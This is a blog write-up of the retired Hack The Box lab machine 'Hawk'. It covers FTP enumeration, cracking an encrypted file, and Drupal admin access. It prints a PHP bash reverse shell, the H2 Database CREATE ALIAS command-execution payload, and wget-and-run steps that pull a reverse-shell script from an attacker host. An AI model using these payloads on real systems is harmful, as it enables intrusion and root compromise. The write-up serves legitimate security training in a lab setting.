<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Hawk - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Hawk from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Hawk">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/hawk/">


  <meta property="og:description" content="My write-up / walkthrough for Hawk from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Hawk">
  <meta name="twitter:description" content="My write-up / walkthrough for Hawk from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/hawk/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2018-12-01T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/hawk/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Hawk">
    <meta itemprop="description" content="Hack The Box - HawkQuick SummaryHawk has retired and this is my write-up about it.It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in !NmapStarting with a simple nmap scan to scan tor TCP , UDP ports and services.nmap -sV -sT -sU 10.10.10.102We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console.FTPSince there’s FTP on the box let’s check if we can do anonymous login.We could login as anonymous and we got a file called : .drupal.txt.encSince it ends with .enc then it’s an encrypted file.Let’s run file command against it to get more information.file drupal.txt.encdrupal.txt.enc : openssl enc'd data with salted password , base64 encodedSo base64 encoded ? Let’s decode it.base64 -d drupal.txt.enc &gt; drupal_decoded.txt.encNow the file is ready for bruteforcing.Decrypting The FileTo get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou.It’s already installed on kali but if you’re not using kali you can get it from hereNow there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing.I already cracked it so the cipher is AES-256-CBC and the digest is SHA256.bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default.Great ! We got the password : friends . Let’s decrypt the file.openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friendsNow we have a username : “daniel” and a password : PencilKeybaordScanner123DrupalWe see in the message that the password is for a portal. But what portal?Let’s visit the website on port 80We see that it’s running drupal CMS Let’s login with the credentials we have.Username daniel didn’t work but admin worked and we got in as admin !After we enumerate for a while we will see some interesting stuff.The content tab which allows us to add content and the modules tab.If we tried to add content we will get two options : Article or a basic page.We will focus on basic pages for sure but we can only use html , filtered html and plain text .Let’s look in the modules tab.We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code Great ! Let’s get a reverse shell&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/9090 0&gt;&amp;1'&quot;); ?&gt;Let’s check our listener.bam we got a low privilege shell as www-data !Privilege Escalation to danielSo we’re now in as www-data let’s check sensitive files first.In drupal 7 documentation This section it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensitive information let’s check that out.We got a password : drupal4hawk , Let’s try sshWe got in ! But when we login we get a python interpreter. We will get a shell with ptyimport ptypty.spawn(&quot;/bin/sh&quot;)And we got user ! :DAccessing H2 DatabaseNow with some regular enumeration if we check out root processes we will see those 2 processes.Sounds familiar ? Yup the H2 Database.If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console.Now we know that it’s running as root so let’s try to access that.Remote connection is disabled. This means that we can only connect locally.To bypass that we will use ssh tunneling.And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us.ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102Now if we visit our localhost on port 8080 we will get the login page.By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error.Let’s try changing the JDBC URL to something we know that it exists. /root :It worked . Now we have access to the console.Abusing H2 Database ALIAS and Privilege Escalation to rootBasically the CREATE ALIAS method creates a function that executes java code.Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell.First we will create ALIAS called SHELLEXEC. The payload will be like this :CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  }$$;Then we will execute system commands by calling the function that we created. Let’s execute whoami.call SHELLEXEC(&quot;whoami&quot;) And we see root :DNOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit herenow since we can execute system commands it’s over ! We can get a root shell.But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it.Another way is to use msfvenom but it’s not needed here because the exploit is simple.First we will create the shell file.bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/1234 0&gt;&amp;1 &gt; shellThen we will set up a HTTP server with python to host the shell.python -m SimpleHTTPServer 7777Now we will use wget to get the shell file on the box.call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;)We will make the file executable.call SHELLEXEC(&quot;chmod +x shell&quot;)Then we will rename it to shell.shcall SHELLEXEC(&quot;mv shell shell.sh&quot;)And finally we execute it.call SHELLEXEC(&quot;bash shell.sh&quot;)We don’t get a response which is a good sign. Let’s check our listener.And we get a shell as root ! :DThat’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - JerryNext Hack The Box write-up : Hack The Box - Active">
    <meta itemprop="datePublished" content="2018-12-01T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/hawk/" class="u-url" itemprop="url">Hack The Box - Hawk
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2018-12-01T07:00:00+02:00">December 1, 2018</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          5 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---hawk">Hack The Box - Hawk</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#ftp">FTP</a></li>
<li><a href="#decrypting-the-file">Decrypting The File</a></li>
<li><a href="#drupal">Drupal</a></li>
<li><a href="#privilege-escalation-to-daniel">Privilege Escalation to daniel</a></li>
<li><a href="#accessing-h2-database">Accessing H2 Database</a></li>
<li><a href="#abusing-h2-database-alias-and-privilege-escalation-to-root">Abusing H2 Database ALIAS and Privilege Escalation to root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---hawk">Hack The Box - Hawk</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hawk has retired and this is my write-up about it.<br>
It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in !
<br><img src="/images/hackthebox/hawk/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>Starting with a simple nmap scan to scan tor TCP , UDP ports and services.<br>
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sU 10.10.10.102</code>
<br><img src="/images/hackthebox/hawk/1.png" alt="" class="align-center"><br><br></p>

<p>We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console.<br></p>

<h2 id="ftp">FTP</h2>
<p>Since there’s FTP on the box let’s check if we can do anonymous login.<br>
<br><img src="/images/hackthebox/hawk/2.png" alt="" class="align-center"><br><br>
We could login as anonymous and we got a file called : .drupal.txt.enc
<br>Since it ends with .enc then it’s an encrypted file.<br>
Let’s run file command against it to get more information.<br></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file drupal.txt.enc
drupal.txt.enc : openssl enc'd data with salted password , base64 encoded
</code></pre></div></div>
<p>So base64 encoded ? Let’s decode it.<br></p>

<p><code class="language-plaintext highlighter-rouge">base64 -d drupal.txt.enc &gt; drupal_decoded.txt.enc</code>
<br><img src="/images/hackthebox/hawk/3.png" alt="" class="align-center"><br><br>
Now the file is ready for bruteforcing.<br></p>

<h2 id="decrypting-the-file">Decrypting The File</h2>
<p>To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou.<br>
It’s already installed on kali but if you’re not using kali you can get it from <a href="https://github.com/glv2/bruteforce-salted-openssl" target="_blank" rel="noopener noreferrer">here</a>
<br>Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing.<br>
I already cracked it so the cipher is AES-256-CBC and the digest is SHA256.<br>
<code class="language-plaintext highlighter-rouge">bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1</code>
<br>You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default.<br>
<br><img src="/images/hackthebox/hawk/4.png" alt="" class="align-center"><br><br>
Great ! We got the password : friends . Let’s decrypt the file.<br>
<code class="language-plaintext highlighter-rouge">openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends</code>
<br><img src="/images/hackthebox/hawk/5.png" alt="" class="align-center"><br><br>
Now we have a username : “daniel” and a password : PencilKeybaordScanner123</p>

<h2 id="drupal">Drupal</h2>
<p>We see in the message that the password is for a portal. But what portal?
<br>Let’s visit the website on port 80
<br><img src="/images/hackthebox/hawk/6.png" alt="" class="align-center"><br><br>
We see that it’s running drupal CMS 
<br>Let’s login with the credentials we have.<br>
Username daniel didn’t work but admin worked and we got in as admin !
<br><img src="/images/hackthebox/hawk/7.png" alt="" class="align-center"><br><br>
After we enumerate for a while we will see some interesting stuff.<br>
The content tab which allows us to add content and the modules tab.<br>
If we tried to add content we will get two options : Article or a basic page.<br>
We will focus on basic pages for sure but we can only use html , filtered html and plain text .<br>
Let’s look in the modules tab.<br>
We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code 
<br><img src="/images/hackthebox/hawk/8.png" alt="" class="align-center"><br><br>
Great ! Let’s get a reverse shell</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/9090 0&gt;&amp;1'"</span><span class="p">);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hawk/9.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/hawk/10.png" alt="" class="align-center"><br><br>
Let’s check our listener.<br>
<br><img src="/images/hackthebox/hawk/11.png" alt="" class="align-center"><br><br>
bam we got a low privilege shell as www-data !</p>

<h2 id="privilege-escalation-to-daniel">Privilege Escalation to daniel</h2>
<p>So we’re now in as www-data let’s check sensitive files first.<br>
In drupal 7 documentation <a href="https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory" target="_blank" rel="noopener noreferrer">This section</a> it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensitive information let’s check that out.<br>
<br><img src="/images/hackthebox/hawk/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/hawk/13.png" alt="" class="align-center"><br><br>
We got a password : drupal4hawk , Let’s try ssh
<br><img src="/images/hackthebox/hawk/14.png" alt="" class="align-center"><br><br>
We got in ! But when we login we get a python interpreter. We will get a shell with pty</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pty</span>
<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hawk/15.png" alt="" class="align-center"><br><br>
And we got user ! :D</p>

<h2 id="accessing-h2-database">Accessing H2 Database</h2>
<p>Now with some regular enumeration if we check out root processes we will see those 2 processes.<br>
<br><img src="/images/hackthebox/hawk/16.png" alt="" class="align-center"><br><br>
Sounds familiar ? Yup the H2 Database.<br>
If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console.<br>
<br><img src="/images/hackthebox/hawk/1.png" alt="" class="align-center"><br><br>
Now we know that it’s running as root so let’s try to access that.<br>
<br><img src="/images/hackthebox/hawk/17.png" alt="" class="align-center"><br><br>
Remote connection is disabled. This means that we can only connect locally.<br>
To bypass that we will use ssh tunneling.<br>
And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us.<br>
<code class="language-plaintext highlighter-rouge">ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102</code>
<br><img src="/images/hackthebox/hawk/18.png" alt="" class="align-center"><br><br>
Now if we visit our localhost on port 8080 we will get the login page.<br>
By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error.<br>
<br><img src="/images/hackthebox/hawk/19.png" alt="" class="align-center"><br><br>
Let’s try changing the JDBC URL to something we know that it exists. <code class="language-plaintext highlighter-rouge">/root</code> :
<br><img src="/images/hackthebox/hawk/20.png" alt="" class="align-center"><br><br>
It worked . Now we have access to the console.<br>
<br><img src="/images/hackthebox/hawk/21.png" alt="" class="align-center"><br><br></p>

<h2 id="abusing-h2-database-alias-and-privilege-escalation-to-root">Abusing H2 Database ALIAS and Privilege Escalation to root</h2>
<p>Basically the <a href="http://www.h2database.com/html/grammar.html#create_alias" target="_blank" rel="noopener noreferrer">CREATE ALIAS</a> method creates a function that executes java code.<br>
Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell.<br>
First we will create ALIAS called SHELLEXEC. The payload will be like this :</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">CREATE</span> <span class="no">ALIAS</span> <span class="no">SHELLEXEC</span> <span class="no">AS</span> <span class="err">$$</span> <span class="nc">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="nc">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span> <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>  <span class="o">}</span><span class="err">$$</span><span class="o">;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hawk/22.png" alt="" class="align-center"><br><br>
Then we will execute system commands by calling the function that we created. Let’s execute whoami.<br>
<code class="language-plaintext highlighter-rouge">call SHELLEXEC("whoami")</code> 
<br><img src="/images/hackthebox/hawk/23.png" alt="" class="align-center"><br><br>
And we see root :D</p>

<p><em>NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html" target="_blank" rel="noopener noreferrer">here</a></em></p>

<p>now since we can execute system commands it’s over ! We can get a root shell.<br>
But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it.<br>
Another way is to use msfvenom but it’s not needed here because the exploit is simple.<br>
First we will create the shell file.<br>
<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/1234 0&gt;&amp;1 &gt; shell</code>
<br>Then we will set up a HTTP server with python to host the shell.<br>
<code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 7777</code>
<br><img src="/images/hackthebox/hawk/24.png" alt="" class="align-center"><br><br>
Now we will use wget to get the shell file on the box.<br>
<code class="language-plaintext highlighter-rouge">call SHELLEXEC("wget http://10.10.xx.xx:7777/shell")</code>
<br><img src="/images/hackthebox/hawk/25.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/hawk/26.png" alt="" class="align-center"><br><br>
We will make the file executable.<br>
<code class="language-plaintext highlighter-rouge">call SHELLEXEC("chmod +x shell")</code>
<br><img src="/images/hackthebox/hawk/27.png" alt="" class="align-center"><br><br>
Then we will rename it to shell.sh
<br><code class="language-plaintext highlighter-rouge">call SHELLEXEC("mv shell shell.sh")</code>
<br><img src="/images/hackthebox/hawk/28.png" alt="" class="align-center"><br><br>
And finally we execute it.<br>
<code class="language-plaintext highlighter-rouge">call SHELLEXEC("bash shell.sh")</code>
<br><img src="/images/hackthebox/hawk/29.png" alt="" class="align-center"><br><br>
We don’t get a response which is a good sign. Let’s check our listener.<br>
<br><img src="/images/hackthebox/hawk/30.png" alt="" class="align-center"><br><br>
And we get a shell as root ! :D</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/jerry/">Hack The Box - Jerry</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/active/">Hack The Box - Active</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-12-01T07:00:00+02:00">December 1, 2018</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/jerry/" class="pagination--pager" title="Hack The Box - Jerry
">Previous</a>
    
    
      <a href="/hack-the-box/active/" class="pagination--pager" title="Hack The Box - Active
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
